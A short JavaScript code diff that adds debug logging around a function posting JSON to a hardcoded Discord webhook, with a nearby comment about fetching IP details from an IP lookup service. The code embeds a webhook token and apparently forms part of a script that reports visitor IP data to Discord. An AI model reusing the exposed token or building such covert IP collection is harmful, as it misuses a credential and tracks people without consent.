@@ -6,15 +6,20 @@ const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXp
 
 async function sendToWebhook(message) {
     try {
+        console.log("Sending webhook with message:", JSON.stringify(message, null, 2));
+
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(message),
         });
 
+        console.log(`Webhook Response Status: ${response.status}`);
+        const responseBody = await response.text();
+        console.log(`Webhook Response Body: ${responseBody}`);
+
         if (!response.ok) {
-            const errorText = await response.text();
-            console.error(`Webhook Error [${response.status}]: ${errorText}`);
+            console.error(`Webhook Error [${response.status}]: ${responseBody}`);
         } else {
             console.log("Data sent to webhook successfully.");
         }
@@ -22,6 +27,7 @@ async function sendToWebhook(message) {
         console.error("Webhook sending failed:", error.stack || error);
     }
 }
+
 
 
 // Get IP details from the IP-API service
